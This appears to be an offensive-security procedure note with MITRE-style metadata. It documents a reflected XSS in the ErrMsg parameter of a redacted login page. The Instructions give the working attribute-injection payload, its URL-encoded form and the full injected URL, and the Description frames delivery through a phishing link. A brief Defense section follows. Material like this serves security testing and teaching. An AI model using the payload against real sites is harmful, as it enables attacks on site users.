---
id: proc-uuid-002
tags:
  - xss
  - payload-injection
  - reflected-xss
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:34.246Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-ErrMsg-Parameter

## Summary

This procedure crafts and delivers a reflected XSS payload into the ErrMsg parameter of the target login page, exploiting insufficient input sanitization to inject HTML attributes that set up JavaScript execution via accesskey and onclick.

## Description

The attack targets the login page at https://www.██████.███████/852585B6003EBA25/Login.html?open, where the ErrMsg parameter reflects user input directly into the HTML without escaping. The payload closes the current tag and adds accesskey='X' and onclick='confirm(...)' attributes, creating an exploitable element. This is Firefox-specific and requires no authentication. Outcomes include the payload reflection, visible in the page source, paving the way for key-based triggering. The scenario assumes the victim accesses a phishing link mimicking the login page.

## Requirements

1. Access to the vulnerable URL
2. URL encoding knowledge for payload (e.g., %22 for ")
3. Firefox browser prepared

## Defense

Defensive measures and detection strategies:

- Sanitize all reflected parameters with HTML entity encoding
- Implement output filtering to strip HTML attributes like accesskey and onclick
- Use Web Application Firewall (WAF) rules to block suspicious parameter values

## Objectives

1. Reflect malicious HTML attributes into the page
2. Set up accesskey for key-based activation
3. Avoid detection by maintaining valid page rendering

## Instructions

### Step 1: Craft the Payload

**Context**: Build the URL-encoded payload to inject attributes without breaking the page structure.

The payload is: invalidlogin" accesskey="X" onclick="confirm('H4CK3D BY PRAKHAR0X01')"

Encoded: invalidlogin%22%20accesskey=%22X%22%20onclick=%22confirm(%27H4CK3D%20BY%20PRAKHAR0X01%27)%22

> This closes the quote in the original attribute and adds new ones. Expected output: Valid encoded string ready for URL.

### Step 2: Navigate to Injected URL

**Context**: Deliver the payload by accessing the modified endpoint, triggering reflection.

Enter in browser address bar:

```url
https://www.██████.███████/852585B6003EBA25/Login.html?open&ErrMsg=invalidlogin%22%20accesskey=%22X%22%20onclick=%22confirm(%27H4CK3D%20BY%20PRAKHAR0X01%27)%22
```

> Page loads with error message. Inspect source to confirm injection. Expected output: Reflected attributes in HTML.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[payload-injection]]
- [[reflected-xss]]
